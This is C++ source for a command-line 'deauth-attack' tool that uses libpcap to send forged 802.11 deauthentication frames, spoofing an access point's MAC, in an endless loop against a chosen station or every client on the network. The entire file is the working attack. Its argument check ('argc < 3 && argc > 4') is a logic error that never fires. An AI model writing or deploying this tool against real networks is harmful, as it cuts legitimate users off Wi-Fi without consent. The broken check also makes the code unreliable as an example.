#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <map>
#include <thread>
#include <unistd.h>

#include "main.h"

void usage()
{
	printf("deauth-attack <interface> <ap mac> [<station mac>]\n");
	printf("deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

int main(int argc, char* argv[])
{
	if (argc < 3 && argc > 4)
	{
		usage();
		return -1; 
	}
	
	char *dev = argv[1];
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	DeauthPacket packetToSend;
	
	packetToSend.rth.it_version = 0x00;
	packetToSend.rth.it_pad = 0x00;
	packetToSend.rth.it_len = 0x0008;
	packetToSend.rth.it_present = 0x00000000;
	packetToSend.bmh.frameControl = 0x00c0;
	packetToSend.bmh.durationID = 0x0000;
	packetToSend.bmh.sequenceControl = 0x0000;
	packetToSend.code.code = 0x0007;
	
	int res;
	while(true)
	{
		packetToSend.bmh.dst = (argc == 3)?Mac("FF:FF:FF:FF:FF:FF"):Mac(argv[3]);
		packetToSend.bmh.source = Mac(argv[2]);
		packetToSend.bmh.BSSID = Mac(argv[2]);
		
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packetToSend), sizeof(DeauthPacket));
		if (res != 0)
		{
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packetToSend), sizeof(DeauthPacket));
		if (res != 0)
		{
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		sleep(1);
	}
	
	pcap_close(handle);
}
